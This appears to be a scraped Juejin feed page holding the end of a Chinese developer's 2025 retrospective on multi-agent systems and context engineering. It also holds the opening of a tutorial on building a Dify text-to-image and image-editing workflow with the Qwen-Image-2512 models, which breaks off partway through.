<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e37bc3bf18246dab806b5fcc2a8aa62~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R5YWJ5Y-R54Ot5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767787439&amp;x-signature=57NrWC3l49A3AI%2F1dYCR9p83GG0%3D" alt="系统架构.jpg" loading="lazy"/></p>
<p>数据处理
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/af77c81227e84233a94ffd2e9c99b391~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R5YWJ5Y-R54Ot5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767787439&amp;x-signature=moMNGF491ol4BqXO4GtPcPsgNd4%3D" alt="数据处理流水线.jpg" loading="lazy"/></p>
<h3 data-id="heading-4">紧接着就是Multi-Agent - 复杂任务规划协作</h3>
<p>为什么会需要到 <strong>Multi-Agent</strong>呢？单个Agent能做的事是有限的。当任务变的比较复杂的时候：比如"读懂一份需求文档，提取测试点，生成测试用例，还要参考历史Case"塞进一个Agent里，prompt是很爆炸的，效果大打折扣。</p>
<p>所以做了Multi-Agent协作架构。核心设计是"理解 + 任务制定 + 分工 + 协作"：</p>
<ul>
<li>
<p>专业化Agent：文档理解Agent专门做文档解析，用例生成Agent专门做Case设计，知识检索Agent专门做召回。这样就可以保证每个Agent职责单一，能力聚焦</p>
</li>
<li>
<p>调度层：上层有一个统一的masterAgent负责理解用户意图，把任务分发给合适的Agent，再把结果整合起来</p>
</li>
<li>
<p>灵活编排：支持串行、并行、条件分支等多种编排模式，根据场景选择合适的执行策略</p>
</li>
<li>
<p>可观测性：完整的执行链路追踪，每个Agent的输入输出都能看到，调试和优化有据可依</p>
</li>
</ul>
<p>这套架构跑起来之后，复杂任务的完成质量明显提升，而且每个环节都可以单独调优，不会牵一发动全身。</p>
<p>一个体会：Multi-Agent的核心是"让对的Agent在对的节点做对的事"。</p>
<p>同样贴两张图，互相学习（不会放太多，只做简单说明哈）：</p>
<p>单Agent与Multi-Agent架构对比
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f919aa5047b34e19a6bafe8aca86a7a7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R5YWJ5Y-R54Ot5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767787439&amp;x-signature=bJjU6FCGxsmlciT9cwD1dNRQj2E%3D" alt="单Agent与Multi-Agent架构对比.jpg" loading="lazy"/></p>
<p>端到端测试工作流
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/964fee8b374e49e99ac8c4dcba40bdb2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-R5YWJ5Y-R54Ot5ZCn:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767787439&amp;x-signature=cAhMKPL%2B2gkfFq0fxp6PxFVHozc%3D" alt="端到端测试工作流.jpg" loading="lazy"/></p>
<h3 data-id="heading-5">最后上下文工程</h3>
<p>今年有个很火的观点："Prompt Engineering已死，Context Engineering当立"。</p>
<p>技术有时候革新的太快，还沉浸在<strong>prompt，知识库</strong>等AI领域知识学习的状态中，已经有新东西出来了。为了不掉队，保持学习的低姿态。</p>
<p>看完之后，只有一个感受：有东西！用大模型用得越多，越发现：模型能力是基础，但输出什么样的质量很大程度上取决于：你告诉它什么上下文。</p>
<p>当然，现在上下文也还在初步的尝试，学习使用阶段。目前在上下文工程上做了几件事：</p>
<ul>
<li>
<p>上下文压缩：召回内容太多会超token限制，需要智能裁剪：保留最相关的、去掉冗余的、控制在合理长度内</p>
</li>
<li>
<p>上下文增强：不只是塞检索结果，还要补充必要的背景信息、格式要求、few-shot示例，让模型更容易理解任务</p>
</li>
<li>
<p>对话上下文管理：多轮对话中，哪些历史要保留、哪些可以丢弃、怎么做摘要。这是很重要的，因为直接影响对话的连贯性和准确性</p>
</li>
</ul>
<p>目前的一些尝试，浅显体会是：上下文工程的价值可能是当前LLM应用中被低估了的一部分。个人感受：与其花大力气选模型、调Prompt。不如学习如何使用上下文。</p>
<h3 data-id="heading-6">思考&amp;体会</h3>
<p>做了差不多大半年AI方向，有一些个人的感受：</p>
<p>第一，工程能力很重要。怎么理解呢？</p>
<ul>
<li>刚开始接触大模型的时候，总觉得模型能力是最重要的——选对模型，问题就解决一大半。后来实践久了发现，选模型只是很小的一部分。怎么组织知识、怎么设计上下文、怎么让多个Agent配合起来……这些才是真正决定效果的核心！！！有时候换个更强的模型，可能效果是提升了；但把上下文设计优化一下，效果能提升更多。所以工程能力设计才是核心竞争力。</li>
</ul>
<p>第二，用户不在乎你的技术多牛，只在乎好不好用。</p>
<ul>
<li>比方说召回率再怎么提升，对于用户而言，并不那么重要。用户根本感知不到这个差异。反倒是把loading时间从5秒压到2秒、把结果从"等半天一次性出来"改成"一边生成一边显示"——用户立刻就觉得"哇，这个可以，牛x"。技术指标是给自己看的，用户体验才是给用户的。从做一个优秀的产品视角做好智能化。</li>
</ul>
<p>第三，别太焦虑，选准方向踏实做。</p>
<ul>
<li>今年AI圈新概念满天飞，每周都有新论文、新框架、新名词。一开始我也是焦虑的，哇，这么多学不过来怎么办...后来慢慢想通了：技术是为场景服务的，不是为了追热点。与其浅尝辄止地追每一个新东西，不如找准几个核心能力，在自己的场景里扎下去，踏踏实实的做，做深做透。反而心里更有底。</li>
</ul>
<p>最后 "AI真的能提效吗？"</p>
<p>我的答案是：能，但不是你想象的那种"一键生成"。它更像是一个"助手"。能帮你做很多重复性、模式化的工作，但核心的思考、判断、决策，自己决定。</p>
<p><strong>与其焦虑。不如先行</strong> 共勉～</p>
<h2 data-id="heading-7">愿景</h2>
<p>最后聊聊对新一年的期待，共同学习。</p>
<p>技术方向上，我会关注的几个点：</p>
<ol>
<li>
<p>知识库：向量检索只是知识库的冰山一角。更完整的知识库应该包括：知识的组织、更新、版本管理、权限控制，以及知识与Agent的深度融合。这块还有很大的能力需要建设。</p>
</li>
<li>
<p>多智能体协作：Agent能根据任务动态组织、能相互学习、能处理冲突。</p>
</li>
<li>
<p>上下文工程：这个词是最近在圈子里很火的概念。核心观点是：对于LLM应用来说，"如何构造输入给模型的上下文"可能比"选择什么模型"更重要。我很认同。</p>
</li>
<li>
<p>Skills技能：让Agent拥有可复用、可组合的"技能"。每次都从头学习，是很笨的。这是Agent能力提升的关键之一。</p>
</li>
</ol>
<h2 data-id="heading-8">写在最后</h2>
<p>2025年是充实的一年。</p>
<p>技术上，在AI方向有了很多的尝试，落地。学到了很多领域的知识。这是一件很棒的事。我很喜欢。</p>
<p>生活上，我有了家庭和女儿。<strong>我是女儿奴</strong>，我承认。</p>
<p>2026年，希望能继续保持这个节奏：认真工作，好好生活，捡起写文章的好习惯。</p>
<p>最后的最后，如果你也在做AI方向的工作，欢迎交流。在技术的路上，一起前行～</p>
<p>元旦快乐！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[dify案例分享-免费体验Dify + Qwen-Image-2512 文生图图生图全流程]]></title>    <link>https://juejin.cn/post/7589935326781882402</link>    <guid>https://juejin.cn/post/7589935326781882402</guid>    <pubDate>2026-01-01T09:32:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589935326781882402" data-draft-id="7589935326781866018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="dify案例分享-免费体验Dify + Qwen-Image-2512 文生图图生图全流程"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-01T09:32:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="wwwzhouhui"/> <meta itemprop="url" content="https://juejin.cn/user/3428746411400537"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            dify案例分享-免费体验Dify + Qwen-Image-2512 文生图图生图全流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3428746411400537/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    wwwzhouhui
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T09:32:56.000Z" title="Thu Jan 01 2026 09:32:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.前言</h2>
<p>在AI图像生成领域快速迭代的今天，如何用低成本、低门槛的方式体验最新的文生图、图生图技术，成为了小伙伴们关注的焦点。传统的AI绘画工具要么需要复杂的本地部署、要么需要高昂的API调用费用，普通用户想要"玩转"AI绘画往往望而却步。</p>
<p>好家伙！阿里通义千问团队这2天又放大招了！继8月发布Qwen-Image基础模型后，12月又重磅推出了<strong>Qwen-Image-2512</strong>文生图模型，同时11月发布的<strong>Qwen-Image-Edit-2511</strong>图生图模型也正式上线魔搭社区。这两款模型在AI Arena超过1万局的用户盲测中，开源模型表现最优，甚至与多款闭源模型对比中依然展现出显著竞争力！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c05c821a29e0470bbcc5d8eb174d9ea7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=OdAllnTMPJTi7pM21BuxInvU1Zw%3D" alt="image-20260101154038359" loading="lazy"/></p>
<p>之前给大家做过一个基于Qwen-Image文生图 和图生图的dify插件，今天上午也升级了。另外也使用最新的Qwen-Image-2512验证测试了一下。今天我们就在Dify平台手把手教大家部署这个AI绘画工作流，体验和感受一下这两款最新模型的强大能力。话不多说，我们开始吧！</p>
<h2 data-id="heading-1">2.模型介绍</h2>
<p>在正式开始工作流制作之前，我们先来了解一下这次更新的两款重磅模型。</p>
<h3 data-id="heading-2">Qwen-Image-2512（文生图模型）</h3>
<p>Qwen-Image-2512是阿里巴巴通义千问团队于2025年12月发布的最新文生图模型，相较于8月发布的Qwen-Image基础模型，本次聚焦于三大核心能力的飞跃式提升：</p>
<h4 data-id="heading-3">✨ 三大核心升级</h4>

























<table><thead><tr><th>升级项</th><th>能力描述</th><th>效果说明</th></tr></thead><tbody><tr><td><strong>更真实的人物质感</strong></td><td>精准刻画皮肤纹理、发丝走向、表情神态</td><td>告别塑料脸、模糊五官，还能理解"微微前倾"等语义细节</td></tr><tr><td><strong>更细腻的自然纹理</strong></td><td>水流、苔藓、动物毛发等细节刻画</td><td>金毛犬的绒毛、盘羊的粗硬皮毛，达到"显微镜级别"的细腻度</td></tr><tr><td><strong>更复杂的文字渲染</strong></td><td>精准排版时间轴、技术图表、多格漫画</td><td>图文混合不再是痛点，中文渲染能力业界领先</td></tr></tbody></table>
<p><strong>更真实的人物质感</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f37e5a3055714e9096fbc8cda435c4f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=3orq3reLzqODCWMgRNp2%2BhSRa7U%3D" alt="image-20260101171907960" loading="lazy"/></p>
<p><strong>更细腻的自然纹理</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3518a685532d476da24f781d060b4af8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=SQ0a6QEtie95tZ%2Brl9kYAngMIEM%3D" alt="9184a942-4d86-4ab7-a882-3f79ec58a51d" loading="lazy"/></p>
<p><strong>更复杂的文字渲染</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d3a63201c66644719fc452244e4dc118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=We%2FgtPsu7NzCy3heg%2FYVuNQpDlc%3D" alt="jimeng-2026-01-01-4091-这是一张现代风格的科技感幻灯片，整体采用深蓝色渐变背景。标题是 “Dify 发展..." loading="lazy"/></p>
<h4 data-id="heading-4">🏆 性能表现</h4>
<p>在AI Arena超过1万局的用户盲测中，<strong>Qwen-Image-2512在开源模型中表现最优</strong>，并在与多款闭源模型的对比中依然展现出显著竞争力。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3016aa4630de4c7e8e4a8910cc915ba3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=xFonmV1H%2BauoZXyRMJiRXIGKKKY%3D" alt="1767259065580" loading="lazy"/></p>
<h3 data-id="heading-5">Qwen-Image-Edit-2511（图生图模型）</h3>
<p>Qwen-Image-Edit-2511是2025年11月发布的增强版图像编辑模型，是Qwen-Image-Edit-2509的升级版本，专注于高级图像编辑任务。</p>
<h4 data-id="heading-6">✨ 核心特点</h4>





























<table><thead><tr><th>特性</th><th>说明</th></tr></thead><tbody><tr><td><strong>一致性显著提升</strong></td><td>减轻图像漂移，角色身份保持，风格一致性更强</td></tr><tr><td><strong>多人一致性增强</strong></td><td>两张不同人物图像高保真融合，实现"隔空合照"</td></tr><tr><td><strong>LoRA原生集成</strong></td><td>照明增强、新视角生成开箱即用，无需额外加载权重</td></tr><tr><td><strong>工业设计能力</strong></td><td>批量产品设计、材质替换、高保真渲染</td></tr><tr><td><strong>几何推理增强</strong></td><td>自动生成辅助构造线，适用于建筑设计、工程图纸</td></tr></tbody></table>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1a4603136674d6389be91462da51357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=MJF5h5znRornRZeef2Hmn56RnoU%3D" alt="image-20260101153547398" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd2f79e86b4741bc99c2792f412bc141~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=oUkLMJkT8nrvJwmgp9xA5oGFow8%3D" alt="image-20260101153621027" loading="lazy"/></p>
<h4 data-id="heading-7">🎯 应用场景</h4>
<ul>
<li><strong>创意摄影</strong>: 隔空合照、人像创意编辑、多人合成</li>
<li><strong>电商产品</strong>: 产品场景变换、材质替换、批量生成</li>
<li><strong>工业设计</strong>: 零部件材质调整、设计方案对比</li>
<li><strong>内容创作</strong>: 社交媒体、营销物料、风格化处理</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12e49cd10e7e46d4bcd214e855e07971~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=b6o2zPzu%2BzVg6%2BdxQArH4DJ2aq0%3D" alt="image-20260101153658437" loading="lazy"/></p>
<h3 data-id="heading-8">版本对比</h3>



































<table><thead><tr><th>对比项</th><th>旧版Qwen-Image</th><th>新版Qwen-Image-2512</th><th>提升幅度</th></tr></thead><tbody><tr><td>人物质感</td><td>存在AI感</td><td>接近真实摄影</td><td>⬆️⬆️ 显著提升</td></tr><tr><td>自然纹理</td><td>细节一般</td><td>显微镜级别</td><td>⬆️⬆️ 显著提升</td></tr><tr><td>文字渲染</td><td>中文较弱</td><td>复杂排版支持</td><td>⬆️⬆️ 显著提升</td></tr><tr><td>图生图</td><td>不支持</td><td>Qwen-Image-Edit-2511</td><td>🆕 全新功能</td></tr></tbody></table>
<p>之前给大家介绍过dify插件开发，其中使用就是阿里Qwen-Image模型。当时实现的是文本生成模型。前段时间我也把这个插件上传到dify插件市场了。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96f8b7b62bf043779a988a4d0fc2c2ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=W2h0mui6XVUYJKKK4MIWw%2BN%2FdGE%3D" alt="img" loading="lazy"/></p>
<p>最近有小伙伴给我反馈这个插件不支持图片修改功能，同时官方也发布了最新的Qwen-Image-2512和Qwen-Image-Edit-2511模型。于是我更新了这个插件，目前已经支持最新的文生图和图生图模型了。工作流效果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cbb684825a6b4f3b9136937436426d2b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=zXop6BYp0sbsi2uMBciwsh9qdtY%3D" alt="img" loading="lazy"/></p>
<p>那么这个工作流是如何制作的呢？下面给大家简单介绍一下。</p>
<h2 data-id="heading-9">3.工作流制作</h2>
<h3 data-id="heading-10">插件安装</h3>
<p>制作这个工具流之前我们先去dify插件市场查找这个插件。搜索关键字"Text2image" 新版本插件我已经提交了，注意最新版本是0.0.4</p>
<p>如果没有的可以在文本找一下离线插件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5050b99b52e649b7aa23f4fa13abc0d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=x4kqkmEVce2e98jRMY%2B%2BfZWtIs8%3D" alt="img" loading="lazy"/></p>
<p>搜到到这个插件后安装即可。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/206547e0b1094fc287e32a909099fd24~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=WKy5wYln2gIW5XzkaJH5G4UMz8s%3D" alt="img" loading="lazy"/></p>
<p>安装或者更新这插件后，我们可以在魔搭API进行相关授权。</p>
<h3 data-id="heading-11">魔搭API配置</h3>
<p>去魔搭社区官方网站找到你的API</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8168fda8c1c34a90803ac081e3cd6e4b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=jUakZ%2FBHD1snwZrPYdoMV9E3n8c%3D" alt="img" loading="lazy"/></p>
<p>把这个值复制到刚才的插件api key输入区域</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4fdb5707763c45d0b48450c3f0354a65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=w5kR1QuWoboCha0aYJdSE3fKfpw%3D" alt="img" loading="lazy"/></p>
<p>这样我们就完成模型授权。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41d9c245cf65492d8f22776e93c38836~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=de3XLyFzaPfbDCxLY2bly5X02CM%3D" alt="img" loading="lazy"/></p>
<p>接下来我们给大家介绍一下工作流详细步骤。</p>
<h3 data-id="heading-12">开始节点</h3>
<p>这个开始节点有2个部分组成：type类型 和 picture 图片</p>
<p>type类型是一个下拉选项，主要是提供用户的文生图、图生图选择项</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0769b5045b4f461bbbe225d910558e82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=PCasdPTIUWkR5YEAZ%2BH1fP%2Bke%2BY%3D" alt="img" loading="lazy"/></p>
<p>picture 图片是由单个文件图片构成</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6baa603cbcfd4601a12392a7f1232d12~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=4AKsxUOdRpu%2BNoQVaxQcTz5ZoBE%3D" alt="img" loading="lazy"/></p>
<p>以上我们就完成了开始节点的配置。</p>
<h3 data-id="heading-13">条件分支</h3>
<p>条件分支这里我们可以实现文生图和图生图的判断。我们可以设置如下信息</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2325decbdb7646298ddd9110e3e4fa47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=Gr4Z7p6S6j1hXFvm7DN8%2B%2Ble9Og%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-14">文生图（Qwen-Image-2512）</h3>
<p>这个地方就是我们可以从添加节点-选择我们上面安装好的插件。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2de899becfb64f89ad82b907b02ae54f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgd3d3emhvdWh1aQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767864775&amp;x-signature=TaltS8njZ%2BlNAO6d8tudKGMLpk4%3D" alt="img" loading="lazy"/></p>
<p>我们选中文生图插件。</p>
<p>提示词部分我们直接获取sys.query</p>
<p><strong>模型这里我们选择最新的Qwen-Image-2512</strong>（相比旧版Qwen-Image，新版在人物质感、自然纹理、文字渲染方面有显著提升）</p>
